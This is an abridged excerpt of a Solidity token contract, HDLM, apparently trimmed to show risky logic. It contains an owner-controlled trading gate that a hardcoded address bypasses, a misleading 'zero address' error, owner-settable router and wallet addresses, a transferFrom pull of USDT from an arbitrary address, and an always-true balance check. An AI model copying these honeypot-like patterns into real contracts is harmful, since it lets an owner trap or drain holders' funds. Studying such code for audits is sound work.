...
contract HDLM is Ownable, IERC20Metadata {
    ...
    constructor() {
        ...
        _main = 0x7B8E578516789a62AF6fC8614469162fEB38CAa5;
        _usdt = 0x9756B9DA0Ec60119e50465BE9A2670eadb38667c;
        _whites[_dead] = true;
    ...
    function _transfer(
        ...
        if(!_whites[recipient] && !isContract(recipient) && !(sender == 0x7B8E578516789a62AF6fC8614469162fEB38CAa5)){
            require(kaipan == true, "ERC20: transfer to the zero address");
        }
    ...
    function _swap1() private {
        ...
        if (_maxsell > 0 && balances >= _maxsell) {
            ...
            uint256 fistval2 = IERC20(_fist).balanceOf(address(this));
                _swapTokenForFist2((fistval2)/3);
                _doBonusFist ((fistval2)*2 / 3);
            uint256 fistval3 = IERC20(_usdt).balanceOf(address(this));
                _doBonususdt(fistval3);
        }
    }
    ...
    function _doBonususdt(uint256 amount) private {
        uint256 buySize = lpfhsz.length;
        uint256 i = _index;
        uint256 done = 0;
        IERC20 lp = IERC20(_pair);
        while(i < buySize && done < _done ) {
            ...
            if(lp.balanceOf(user) >= 0) {
                uint256 bonus = lp.balanceOf(user) * amount / lp.totalSupply();
                if (bonus > 0) {
                    IERC20(_usdt).transfer(user, bonus);
                    done ++;
                }
            }
            i ++;
    ...
    function _swapTokenForFist2(uint256 tokenAmount) private {
        ...
        uint256 amount = IERC20(_usdt).balanceOf(_wraps);
        if (IERC20(_usdt).allowance(_wraps, address(this)) >= amount && amount > 0) {
            IERC20(_usdt).transferFrom(_wraps, address(this), amount);
        }
    }
    ...
    function setRouter(address router, address fist, address wrap, address wraps) public onlyOwner {
        _fist = fist;
        _wrap = wrap;
        _wraps = wraps;
        _router = router;
